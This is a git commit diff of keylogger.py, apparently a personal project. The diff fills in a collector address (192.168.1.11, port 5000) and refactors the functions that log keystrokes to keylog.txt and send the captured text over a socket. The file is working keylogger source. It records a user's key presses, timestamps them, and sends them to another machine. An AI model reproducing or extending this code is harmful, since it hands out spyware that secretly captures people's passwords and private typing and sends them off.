a85c266d9b75527c65e36c94c5b9161dca0b73c8
MateuszGontarek <mateuszgontarek2020@gmail.com>
2023-02-16 18:15:30 +0100

    change write_to_file and send_to_server

--- keylogger.py
+++ keylogger.py
@@ -4,38 +4,37 @@ import socket
 
 
 def connect():
-    ip = 'IP'
-    port = 'PORT'
+    ip = '192.168.1.11'
+    port = 5000
     s = socket.socket()
     s.connect((ip, port))
     return s
 
 
 def write_to_file(recorded):
-    f = open('keylog.txt', 'a', encoding='utf-8')
-    f.write(str(datetime.datetime.now()) + ': ')
-    for key in recorded:
-        if len(key.name) > 1:
-            if key.name == 'space': 
-                f.write(' ')
-            else:
-                f.write('[' + key.name + ']')
-        else: 
-            f.write(key.name + '')
-    f.write('\n')
-    f.close()
+    with open('keylog.txt', 'a', encoding='utf-8') as f:
+        result = str(datetime.datetime.now()) + ': '
+        for key in recorded:
+            if len(key.name) > 1:
+                if key.name == 'space': 
+                    result += ' '
+                else:
+                    result += '[' + key.name + ']'
+            else: 
+                result += key.name
+        result += '\n'
+        f.write(result)
+        f.close()
+        return result
 
 
-def send_to_server(connection):
-    with open('keylog.txt', 'r') as f:
-        lines = f.readlines()
-        connection.send(lines[-1].encode('utf-8'))
-    connection.close()
+def send_to_server(connection, result):
+    connection.send(result.encode('utf-8'))
 
 
 recorded = keyboard.record(until='esc')
 recorded = [event for event in recorded if event.event_type == 'down'][:-1]
 
 connection = connect()
-write_to_file(recorded)
-send_to_server(connection)
+result = write_to_file(recorded)
+send_to_server(connection, result)
